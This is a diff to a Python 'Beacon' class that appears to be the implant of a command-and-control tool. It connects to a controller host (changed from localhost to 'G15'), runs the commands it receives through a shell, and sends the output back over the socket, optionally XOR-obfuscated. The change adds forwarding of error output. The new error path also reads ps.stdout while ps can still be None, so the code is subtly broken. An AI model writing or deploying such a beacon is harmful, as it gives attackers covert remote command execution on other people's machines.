@@ -30,9 +30,20 @@ class Beacon:
          self.sock.close()
 
    def run_command(self,command):
+      ps = None
       try:
          cmd = command.split(" ")
-         ps = subprocess.run(cmd, shell=True, capture_output=True,check=True)
+         try:
+            ps = subprocess.run(cmd, shell=True, capture_output=True,check=True)
+         except subprocess.CalledProcessError as e:
+            if self.debugging == True:
+               print("Error:",e)
+            if self.encryption == True:
+               self.sock.send(self.encrypt(e.output))
+               self.sock.send(self.encrypt("END".encode()))
+            else:
+               self.sock.send(e.output)
+               self.sock.send("END".encode())
          if self.debugging == True:
             print("Sending:" ,ps.stdout)
          if ps.stdout != None and ps.stdout != b'':
@@ -122,6 +133,7 @@ class Beacon:
    def terminate(self):
       self.running = False
       if self.sock:
+         self.sock.shutdown(socket.SHUT_RDWR)
          self.sock.close()
    
    def encrypt(self,data):
@@ -133,7 +145,7 @@ class Beacon:
       return strxor(data,key.encode())
 
 def main():
-   beacon = Beacon("127.0.0.1",10267)
+   beacon = Beacon("G15",10267)
    beacon.start()
 
 if __name__ == "__main__":
